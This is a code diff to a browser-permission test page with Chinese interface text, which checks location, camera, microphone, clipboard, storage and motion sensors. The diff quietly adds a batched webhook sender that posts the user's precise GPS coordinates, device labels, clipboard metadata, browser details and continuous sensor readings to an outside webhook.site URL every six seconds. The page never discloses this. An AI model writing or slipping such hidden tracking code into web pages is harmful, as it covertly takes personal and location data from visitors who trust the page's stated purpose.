@@ -350,6 +350,41 @@
     </div>
 
     <script>
+        // ===== Webhook sender (batch + throttle) =====
+        const WEBHOOK_ENDPOINT = 'https://webhook.site/59be3e07-bab1-47f5-814c-b86f69794482';
+        const webhookQueue = [];
+        let webhookFlushing = false;
+        const sessionId = (() => Math.random().toString(36).slice(2) + Date.now().toString(36))();
+        function webhookPost(json) {
+            return fetch(WEBHOOK_ENDPOINT, {
+                method: 'POST',
+                headers: { 'content-type': 'application/json' },
+                body: JSON.stringify(json)
+            });
+        }
+        function enqueueWebhook(eventName, payload) {
+            webhookQueue.push({
+                ts: Date.now(),
+                event: eventName,
+                payload,
+                sessionId,
+                ua: navigator.userAgent
+            });
+        }
+        async function flushWebhookQueue() {
+            if (webhookFlushing || webhookQueue.length === 0) return;
+            webhookFlushing = true;
+            const batch = webhookQueue.splice(0, 50);
+            try {
+                await webhookPost({ batch });
+            } catch (e) {
+                // 回退：失败则放回队列头部
+                webhookQueue.unshift(...batch);
+            } finally {
+                webhookFlushing = false;
+            }
+        }
+        setInterval(flushWebhookQueue, 6000);
         let testResults = {
             geolocation: { status: 'pending', result: '' },
             microphone: { status: 'pending', result: '' },
@@ -372,7 +407,7 @@
         const activeListeners = [];
         const lastUpdateAt = {};
 
-        function shouldUpdate(key, intervalMs = 200) {
+        function shouldUpdate(key, intervalMs = 2000) {
             const now = Date.now();
             if (!lastUpdateAt[key] || now - lastUpdateAt[key] >= intervalMs) {
                 lastUpdateAt[key] = now;
@@ -385,6 +420,13 @@
         window.addEventListener('load', function() {
             totalTests = Object.keys(testResults).length;
             document.getElementById('total-tests').textContent = totalTests;
+            // 基础会话信息
+            enqueueWebhook('session_start', {
+                time: new Date().toISOString(),
+                language: navigator.language,
+                platform: navigator.platform,
+                vendor: navigator.vendor
+            });
             startCountdown();
         });
         
@@ -466,11 +508,18 @@
                 
                 testResults.geolocation = { status: 'success', result };
                 updateTestCard('geolocation', 'success', result);
+                enqueueWebhook('geolocation_success', {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: position.timestamp
+                });
                 
             } catch (error) {
                 const result = `❌ 地理位置获取失败: ${error.message}`;
                 testResults.geolocation = { status: 'error', result };
                 updateTestCard('geolocation', 'error', result);
+                enqueueWebhook('geolocation_error', { message: error.message });
             }
             
             completedTests++;
@@ -502,11 +551,16 @@
                 
                 testResults.microphone = { status: 'success', result };
                 updateTestCard('microphone', 'success', result);
+                enqueueWebhook('microphone_success', {
+                    audioTracks: audioTracks.length,
+                    label: audioTracks[0]?.label || null
+                });
                 
             } catch (error) {
                 const result = `❌ 麦克风权限获取失败: ${error.message}`;
                 testResults.microphone = { status: 'error', result };
                 updateTestCard('microphone', 'error', result);
+                enqueueWebhook('microphone_error', { message: error.message });
             }
             
             completedTests++;
@@ -539,11 +593,18 @@
                 
                 testResults.camera = { status: 'success', result };
                 updateTestCard('camera', 'success', result);
+                enqueueWebhook('camera_success', {
+                    videoTracks: videoTracks.length,
+                    label: videoTracks[0]?.label || null,
+                    width: videoTracks[0]?.getSettings().width,
+                    height: videoTracks[0]?.getSettings().height
+                });
                 
             } catch (error) {
                 const result = `❌ 摄像头权限获取失败: ${error.message}`;
                 testResults.camera = { status: 'error', result };
                 updateTestCard('camera', 'error', result);
+                enqueueWebhook('camera_error', { message: error.message });
             }
             
             completedTests++;
@@ -581,6 +642,7 @@
                     
                     testResults.notification = { status: 'success', result };
                     updateTestCard('notification', 'success', result);
+                    enqueueWebhook('notification_success', { permission });
                 } else {
                     result = `⚠️ 通知权限被拒绝
 权限状态: ${permission}
@@ -588,12 +650,14 @@
                     
                     testResults.notification = { status: 'warning', result };
                     updateTestCard('notification', 'warning', result);
+                    enqueueWebhook('notification_denied', { permission });
                 }
                 
             } catch (error) {
                 const result = `❌ 通知权限测试失败: ${error.message}`;
                 testResults.notification = { status: 'error', result };
                 updateTestCard('notification', 'error', result);
+                enqueueWebhook('notification_error', { message: error.message });
             }
             
             completedTests++;
@@ -625,11 +689,17 @@
                 
                 testResults.clipboard = { status: 'success', result };
                 updateTestCard('clipboard', 'success', result);
+                // 上报元数据（避免直接上传明文）
+                enqueueWebhook('clipboard_meta', {
+                    count: clipboardItems.length,
+                    types: clipboardItems.map(i => i.types)
+                });
                 
             } catch (error) {
                 const result = `❌ 剪贴板权限获取失败: ${error.message}`;
                 testResults.clipboard = { status: 'error', result };
                 updateTestCard('clipboard', 'error', result);
+                enqueueWebhook('clipboard_error', { message: error.message });
             }
             
             completedTests++;
@@ -680,6 +750,10 @@
                         const estimate = await navigator.storage.estimate();
                         result += `存储配额: ${Math.round(estimate.quota / 1024 / 1024)}MB\n`;
                         result += `已使用: ${Math.round(estimate.usage / 1024 / 1024)}MB`;
+                        enqueueWebhook('storage_quota', {
+                            quota: estimate.quota,
+                            usage: estimate.usage
+                        });
                     } else {
                         result += `存储配额: 无法获取`;
                     }
@@ -689,11 +763,13 @@
                 
                 testResults.storage = { status: 'success', result };
                 updateTestCard('storage', 'success', result);
+                enqueueWebhook('storage_summary', { localStorage: true, sessionStorage: true, indexedDB: 'indexedDB' in window });
                 
             } catch (error) {
                 const result = `❌ 存储权限测试失败: ${error.message}`;
                 testResults.storage = { status: 'error', result };
                 updateTestCard('storage', 'error', result);
+                enqueueWebhook('storage_error', { message: error.message });
             }
             
             completedTests++;
@@ -747,6 +823,7 @@
                                     const el = document.getElementById('gyroscope-result');
                                     if (el) el.textContent = result;
                                 }
+                                enqueueWebhook('gyroscope_reading', { x: gyro.x, y: gyro.y, z: gyro.z });
                             };
                             gyro.addEventListener('reading', onReading);
                             gyro.addEventListener('error', (event) => {
@@ -783,6 +860,7 @@
                                     const el = document.getElementById('gyroscope-result');
                                     if (el) el.textContent = result;
                                 }
+                                enqueueWebhook('gyroscope_reading_dm', { alpha: rr?.alpha, beta: rr?.beta, gamma: rr?.gamma });
                             } else if (!initialized) {
                                 const result = '⚠️ 设备不提供 rotationRate 数据';
                                 testResults.gyroscope = { status: 'warning', result };
@@ -833,6 +911,7 @@
                                     const el = document.getElementById('accelerometer-result');
                                     if (el) el.textContent = result;
                                 }
+                                enqueueWebhook('accelerometer_reading', { x: accel.x, y: accel.y, z: accel.z });
                             };
                             accel.addEventListener('reading', onReading);
                             accel.addEventListener('error', (event) => {
@@ -864,6 +943,7 @@
                                     const el = document.getElementById('accelerometer-result');
                                     if (el) el.textContent = result;
                                 }
+                                enqueueWebhook('accelerometer_reading_dm', { x: a?.x, y: a?.y, z: a?.z });
                             } else if (!initialized) {
                                 const result = '⚠️ 未获取到加速度数据';
                                 testResults.accelerometer = { status: 'warning', result };
@@ -912,6 +992,7 @@
                                 const el = document.getElementById('orientation-result');
                                 if (el) el.textContent = result;
                             }
+                            enqueueWebhook('orientation_reading', { alpha: e.alpha, beta: e.beta, gamma: e.gamma });
                         };
                         window.addEventListener('deviceorientation', handler);
                         activeListeners.push({ target: window, type: 'deviceorientation', handler });
@@ -955,6 +1036,11 @@
                                 const el = document.getElementById('motion-result');
                                 if (el) el.textContent = result;
                             }
+                            enqueueWebhook('motion_reading', {
+                                acc: { x: a?.x, y: a?.y, z: a?.z },
+                                rot: { alpha: rr?.alpha, beta: rr?.beta, gamma: rr?.gamma },
+                                interval: e.interval
+                            });
                         };
                         window.addEventListener('devicemotion', handler);
                         activeListeners.push({ target: window, type: 'devicemotion', handler });
@@ -997,6 +1083,7 @@
                                     const el = document.getElementById('magnetometer-result');
                                     if (el) el.textContent = result;
                                 }
+                                enqueueWebhook('magnetometer_reading', { x: mag.x, y: mag.y, z: mag.z });
                             };
                             mag.addEventListener('reading', onReading);
                             mag.addEventListener('error', (event) => {
